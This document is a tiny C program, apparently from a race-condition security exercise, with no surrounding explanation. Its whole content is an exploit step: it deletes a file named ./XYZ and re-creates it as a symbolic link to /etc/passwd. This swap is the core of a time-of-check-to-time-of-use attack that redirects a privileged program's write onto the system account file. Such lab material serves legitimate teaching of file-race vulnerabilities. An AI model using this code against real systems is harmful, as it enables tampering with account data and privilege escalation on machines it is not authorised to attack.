#include <unistd.h>

int main(void) {
	unlink("./XYZ");
	symlink("/etc/passwd","./XYZ");
}
